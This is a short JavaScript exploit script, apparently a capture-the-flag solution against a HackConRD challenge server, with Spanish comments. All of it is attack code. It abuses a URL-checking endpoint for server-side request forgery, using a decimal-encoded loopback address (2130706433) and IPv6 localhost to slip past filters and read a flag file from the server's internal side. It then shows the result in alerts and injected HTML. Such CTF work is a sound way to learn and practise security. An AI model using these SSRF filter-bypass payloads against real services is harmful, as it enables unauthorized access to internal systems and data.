var ssrfUrl = 'http://311b405f-4c7f-45d5-94f9-999a49604ce1.ctf.hackconrd.org:8001/check?url=' + 
  encodeURIComponent('http://2130706433:8001/flag.txt');

fetch(ssrfUrl)
  .then(r => r.text())
  .then(data => {
    document.body.innerHTML += '<pre style="background:yellow;font-size:24px;padding:20px">' + data + '</pre>';
    alert(data);
  })
  .catch(e => alert('Error: ' + e));

// También intentar rutas alternativas
var urls = [
  'http://2130706433/flag.txt',
  'http://[::1]/flag.txt',
  'http://2130706433:8001/flag.txt',
];

urls.forEach(u => {
  fetch('/check?url=' + encodeURIComponent(u))
    .then(r => r.text())
    .then(d => {
      if(d.includes('HCRD')) {
        alert('FLAG ENCONTRADA: ' + d);
        document.body.innerHTML += '<pre style="background:red;color:white;font-size:30px">' + d + '</pre>';
      }
    });
});